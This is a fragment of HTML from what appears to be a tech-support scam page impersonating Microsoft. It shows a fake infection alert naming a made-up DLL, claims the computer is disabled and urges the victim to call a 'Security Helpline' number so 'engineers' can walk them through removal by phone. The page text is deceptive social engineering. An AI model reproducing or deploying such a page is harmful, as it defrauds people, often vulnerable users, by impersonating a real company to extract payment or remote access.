            ...
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Microsoft: </span><span
                        style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-877-507-1944



                 (Security Helpline)</span></span>
            </div>
        </div>
        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #eee;font-size: 14px;">Windows
...
<div id="poptxt" class="lightbox">
    ...
    <div id="txtintro">
                <span class="colo-rd">App: Ads.fiancetrack(0xf2).dll<br>
    ...
    <div id="disclaimer">
        ...
        <span class="support">Contact Windows Support: +1-877-507-1944



                 (Security Helpline)</span>
    </div>
    <div id="bottom">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    ...
    <p>You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.</p>
    <p>Call Microsoft Support immediately to report this threat, prevent identity theft and unlock access to this
        device.</p>
...
<div id="welcomeDiv"
    ...
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use
        your computer.<br>Your computer is disabled. Please call Microsoft.<br>Access is the block security reason for this
